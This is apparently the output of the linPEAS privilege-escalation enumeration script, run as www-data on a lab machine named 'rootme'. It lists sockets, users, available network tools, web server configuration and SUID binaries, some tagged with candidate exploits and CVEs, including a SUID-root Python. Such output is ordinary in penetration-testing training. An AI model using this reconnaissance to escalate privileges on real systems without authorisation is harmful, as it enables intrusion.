/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request
/snap/core/8268/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8268/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8268/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/8268/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/8268/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/8268/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core/8268/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core/8268/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core/8268/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core/8268/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core/9665/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                                                                                                                                  
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                                                                                                    
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                 669 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 684 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                   1 systemd         root             :1.2          init.scope                -          -                  
:1.26                               8014 busctl          www-data         :1.26         apache2.service           -          -                  
:1.3                                 795 systemd-logind  root             :1.3          systemd-logind.service    -          -                  
:1.5                                 835 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
:1.6                                 857 polkitd         root             :1.6          polkit.service            -          -                  
:1.8                                 800 networkd-dispat root             :1.8          networkd-dispatcher.se…ce -          -                  
:1.9                                 829 unattended-upgr root             :1.9          unattended-upgrades.se…ce -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             835 accounts-daemon[0m root             :1.5          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1           857 polkitd         root             :1.6          polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               795 systemd-logind  root             :1.3          systemd-logind.service    -          -                  
org.freedesktop.network1             669 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             684 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.2          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Hostname, hosts and DNS
rootme                                                                                                                                                                                                                                      
127.0.0.1 localhost
127.0.1.1 rootme

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.240.119  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::e8:52ff:fe91:712b  prefixlen 64  scopeid 0x20<link>
        ether 02:e8:52:91:71:2b  txqueuelen 1000  (Ethernet)
        RX packets 60285  bytes 9381099 (9.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 58777  bytes 27130008 (27.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 426  bytes 36311 (36.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 426  bytes 36311 (36.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                                                                                                    
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                                                                                       

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                                                                                                      
ptrace protection is enabled (1)                                                                                                                                                                                                            
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                  
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             
rootme:x:1000:1000:RootMe:/home/rootme:/bin/bash
test:x:1001:1001:,,,:/home/test:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(rootme) gid=1000(rootme) groups=1000(rootme),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(test) gid=1001(test) groups=1001(test)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 04:08:17 up 58 min,  0 users,  load average: 0.13, 0.03, 0.01                                                                                                                                                                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
reboot   system boot  Tue Aug  4 19:33:39 2020 - Tue Aug  4 19:36:41 2020  (00:03)     0.0.0.0                                                                                                                                              
rootme   pts/0        Tue Aug  4 17:09:43 2020 - Tue Aug  4 17:54:45 2020  (00:45)     192.168.0.106
root     tty1         Tue Aug  4 17:08:53 2020 - down                      (00:46)     0.0.0.0
reboot   system boot  Tue Aug  4 17:08:04 2020 - Tue Aug  4 17:54:55 2020  (00:46)     0.0.0.0
rootme   pts/1        Tue Aug  4 16:00:32 2020 - Tue Aug  4 17:07:50 2020  (01:07)     192.168.0.106
rootme   pts/0        Tue Aug  4 15:08:58 2020 - Tue Aug  4 17:07:54 2020  (01:58)     192.168.0.106
rootme   tty1         Tue Aug  4 15:03:51 2020 - down                      (02:04)     0.0.0.0
reboot   system boot  Tue Aug  4 15:03:06 2020 - Tue Aug  4 17:07:54 2020  (02:04)     0.0.0.0

wtmp begins Tue Aug  4 15:03:06 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
root             tty1                      Tue Aug  4 17:08:53 +0000 2020
rootme           pts/0    192.168.0.106    Tue Aug  4 17:09:43 +0000 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/curl
/usr/bin/lxc
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python
/usr/bin/python2
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8                                                                                                                                                                                                                            

╔══════════╣ Searching mysql credentials and exec
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)                                                                                                                                                                                      
Server built:   2020-03-13T12:26:16
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/apache2.conf-
/etc/apache2/apache2.conf:AddType application/x-httpd-php .php5 .php
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Aug  4  2020 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Aug  4  2020 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Aug  4  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Jul 16  2019 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Aug  4  2020 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 71817 May 26  2020 /etc/php/7.2/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 71429 May 26  2020 /etc/php/7.2/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Aug  4  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
ChallengeResponseAuthentication no                                                                                                                                                                                                          
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem                                                                                                                                                                                                       
/snap/core/8268/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core/8268/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core/8268/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core/8268/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core/8268/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core/8268/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core/8268/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core/8268/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core/8268/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core/8268/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core/8268/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core/8268/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core/8268/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core/8268/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core/8268/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/snap/core/8268/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/snap/core/8268/etc/ssl/certs/CA_Disig_Root_R2.pem
/snap/core/8268/etc/ssl/certs/CFCA_EV_ROOT.pem
/snap/core/8268/etc/ssl/certs/COMODO_Certification_Authority.pem
1646PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                                                                              
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Aug  4  2020 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                                                                                                      
tmux 2.6                                                                                                                                                                                                                                    


/tmp/tmux-33
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jan 15  2020 /etc/cloud/cloud.cfg                                                                                                                                                                               
     lock_passwd: True
-rw-r--r-- 1 root root 3612 Oct  4  2019 /snap/core/8268/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3517 Jan 16  2020 /snap/core/9665/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Dec  6  2019 /snap/core/8268/usr/share/keyrings                                                                                                                                                                  
drwxr-xr-x 2 root root 121 Jul 10  2020 /snap/core/9665/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Feb  3  2020 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /snap/core/8268/etc/pam.d/passwd
passwd file: /snap/core/8268/etc/passwd
passwd file: /snap/core/8268/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/8268/var/lib/extrausers/passwd
passwd file: /snap/core/9665/etc/pam.d/passwd
passwd file: /snap/core/9665/etc/passwd
passwd file: /snap/core/9665/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/9665/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 13395 Dec  6  2019 /snap/core/8268/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/8268/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 15136 Jul 10  2020 /snap/core/9665/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 14076 Jun  3  2020 /snap/core/9665/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 Jun  3  2020 /snap/core/9665/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 Jun  3  2020 /snap/core/9665/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 rootme rootme 4096 Aug  4  2020 /home/rootme/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/8268/usr/share/bash-completion/completions/postfix                                                                                                                                       

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/9665/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                                                                            

-rw-r--r-- 1 root root 69 May 26  2020 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 May 26  2020 /usr/share/php7.2-common/common/ftp.ini






╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                                                                                                                                  
-rw-r--r-- 1 rootme rootme 3771 Apr  4  2018 /home/rootme/.bashrc
-rw-r--r-- 1 test test 3771 Aug  4  2020 /home/test/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8268/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/9665/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 rootme rootme 807 Apr  4  2018 /home/rootme/.profile
-rw-r--r-- 1 test test 807 Aug  4  2020 /home/test/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8268/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/9665/etc/skel/.profile



-rw-r--r-- 1 rootme rootme 0 Aug  4  2020 /home/rootme/.sudo_as_admin_successful



                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
strings Not Found                                                                                                                                                                                                                           
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                   
-rwsr-xr-x 1 root root 111K Jul 10  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 root root 3.5M Aug  4  2020 /usr/bin/python
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 40K Oct 10  2019 /snap/core/8268/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27K Oct 10  2019 /snap/core/8268/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8268/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8268/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Oct 11  2019 /snap/core/8268/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/9665/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9665/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9665/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9665/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/9665/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/9665/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9665/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/9665/usr/bin/newgrp  --->  HP-UX_10.20
